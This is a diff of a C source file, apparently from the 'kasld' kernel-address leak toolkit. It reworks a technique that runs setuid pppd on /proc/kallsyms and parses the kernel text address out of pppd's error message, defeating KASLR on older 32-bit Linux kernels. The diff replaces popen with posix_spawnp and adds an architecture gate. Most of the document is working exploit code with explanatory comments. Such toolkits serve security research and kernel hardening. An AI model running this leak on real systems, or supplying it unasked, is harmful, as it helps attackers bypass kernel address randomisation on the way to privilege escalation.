@@ -24,17 +24,40 @@
 //   Also gated by kptr_restrict >= 1 (default since v5.10). Requires
 //   set-uid pppd binary to be installed.
 //
+// Subprocess invocation:
+//   posix_spawnp (not popen). The leak relies on pppd's syscall sequence
+//   inside the kernel (open() then read() of /proc/kallsyms while suid),
+//   NOT on shell expansion of the command line — so the shell is pure
+//   weight here. posix_spawnp gives an explicit argv array, no shell, no
+//   metacharacter interpretation, and the same effective semantics. The
+//   "2>&1" effect is replicated by dup2'ing the pipe write-end to BOTH
+//   stdout and stderr in posix_spawn_file_actions.
+//
 // References:
 // https://www.openwall.com/lists/kernel-hardening/2013/10/14/2
+//
+// 32-bit-kernel only — gated at compile time. The pre-v4.8 kernel bug
+// affects every architecture, but the exploit technique relies on the
+// FIRST line of /proc/kallsyms being _stext, which is the case on 32-bit
+// kernels. On 64-bit kernels the first symbol is typically a per-CPU
+// variable at address 0 and the technique returns a garbage address.
 // ---
 // <bcoles@gmail.com>
+
+#if __SIZEOF_LONG__ != 4
+#error "Architecture is not supported"
+#endif
 
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
 #include <errno.h>
+#include <spawn.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/wait.h>
+#include <unistd.h>
+/* `environ` is declared by <unistd.h> under _GNU_SOURCE on glibc + musl. */
 
 KASLD_EXPLAIN(
     "Prior to v4.8, kptr_restrict's %pK check happened at read() rather "
@@ -51,29 +74,83 @@ KASLD_META("method:parsed\n"
            "sysctl:kptr_restrict>=1\n"
            "patch:v4.8\n");
 
-unsigned long get_kernel_addr_pppd_kallsyms() {
-  FILE *f;
+/* Spawn `pppd file /proc/kallsyms` with stdout + stderr captured. Returns
+ * a FILE* read handle on success (caller must fclose + waitpid via the
+ * out-parameters), NULL on spawn failure. */
+static FILE *spawn_pppd(pid_t *child_out) {
+  int pipefd[2];
+  if (pipe(pipefd) < 0) {
+    perror("[-] pipe");
+    return NULL;
+  }
+
+  posix_spawn_file_actions_t actions;
+  if (posix_spawn_file_actions_init(&actions) != 0) {
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return NULL;
+  }
+  /* Close the read end in the child, then dup the write end to both
+   * stdout and stderr (the "2>&1" effect — pppd's error message goes to
+   * stderr, but capturing both is harmless and matches the prior
+   * behaviour). Close the original write fd after the dups. */
+  posix_spawn_file_actions_addclose(&actions, pipefd[0]);
+  posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDOUT_FILENO);
+  posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDERR_FILENO);
+  posix_spawn_file_actions_addclose(&actions, pipefd[1]);
+
+  /* posix_spawnp's argv is `char *const argv[]` — string literals would
+   * trip -Wcast-qual. Use mutable char[] arrays so the argv pointers are
+   * legitimately non-const. */
+  char arg0[] = "pppd";
+  char arg1[] = "file";
+  char arg2[] = "/proc/kallsyms";
+  char *const argv[] = {arg0, arg1, arg2, NULL};
+  pid_t pid;
+  int rc = posix_spawnp(&pid, "pppd", &actions, NULL, argv, environ);
+  posix_spawn_file_actions_destroy(&actions);
+  close(pipefd[1]); /* parent doesn't write */
+  if (rc != 0) {
+    errno = rc;
+    perror("[-] posix_spawnp pppd");
+    close(pipefd[0]);
+    return NULL;
+  }
+
+  FILE *f = fdopen(pipefd[0], "r");
+  if (!f) {
+    perror("[-] fdopen");
+    close(pipefd[0]);
+    /* Best-effort reap; child likely terminates shortly after pipe close. */
+    waitpid(pid, NULL, 0);
+    return NULL;
+  }
+  *child_out = pid;
+  return f;
+}
+
+static unsigned long get_kernel_addr_pppd_kallsyms(void) {
   char *addr_buf;
   char *endptr;
-  const char *cmd = "pppd file /proc/kallsyms 2>&1";
   unsigned long addr = 0;
   char buf[1024];
 
-  printf("[.] trying '%s' ...\n", cmd);
+  printf("[.] trying 'pppd file /proc/kallsyms' (via posix_spawn) ...\n");
 
-  f = popen(cmd, "r");
-  if (f == NULL) {
-    perror("[-] popen");
+  pid_t pid = -1;
+  FILE *f = spawn_pppd(&pid);
+  if (!f)
     return 0;
-  }
 
   if (fgets(buf, sizeof(buf) - 1, f) == NULL) {
     perror("[-] fgets");
-    pclose(f);
+    fclose(f);
+    waitpid(pid, NULL, 0);
     return 0;
   }
 
-  pclose(f);
+  fclose(f);
+  waitpid(pid, NULL, 0);
 
   /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
   if (strstr(buf, "unrecognized option") == NULL)
@@ -85,7 +162,7 @@ unsigned long get_kernel_addr_pppd_kallsyms() {
 
   addr = strtoul(&addr_buf[1], &endptr, 16);
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr;
 
   return 0;
